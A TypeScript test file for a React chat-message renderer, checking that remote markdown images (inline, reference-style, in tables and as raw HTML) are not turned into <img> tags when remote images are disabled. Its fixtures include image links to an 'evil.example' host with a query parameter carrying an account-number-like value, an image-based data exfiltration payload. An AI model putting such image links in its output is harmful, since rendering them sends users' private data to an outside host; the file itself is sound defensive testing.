import { test } from 'node:test'
import assert from 'node:assert/strict'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { MessageContent } from './MessageContent'

const LEAK = 'Done.\n\n![x](https://evil.example/p?d=CH9300762011623852957)\n\nSee [link](https://example.com).'
const html = (remoteImages?: boolean, isStreaming = false) =>
  renderToStaticMarkup(createElement(MessageContent, { content: LEAK, role: 'assistant', theme: 'dark', remoteImages, isStreaming }))

test('remoteImages=false - no <img>, shown as source text (also while streaming)', () => {
  for (const streaming of [false, true]) {
    const out = html(false, streaming)
    assert.ok(!/<img/i.test(out), out)
    assert.ok(out.includes('![x](https://evil.example/p?d=CH9300762011623852957)'), out)
    assert.ok(out.includes('href="https://example.com"'), '링크는 그대로')
  }
})

test('remoteImages=false - no <img> for reference-style images, images in tables or raw HTML', () => {
  const md = [
    '![ref][r]', '', '[r]: https://evil.example/r.png', '',
    '| a | b |', '|---|---|', '| ![t](https://evil.example/t.png) | x |', '',
    '<img src="https://evil.example/h.png">',
  ].join('\n')
  const out = renderToStaticMarkup(createElement(MessageContent, { content: md, role: 'assistant', theme: 'dark', remoteImages: false }))
  assert.ok(!/<img/i.test(out), out)
})

test('default (other chat screens) - images render as before', () => {
  assert.match(html(), /<img[^>]+src="https:\/\/evil\.example/)
})
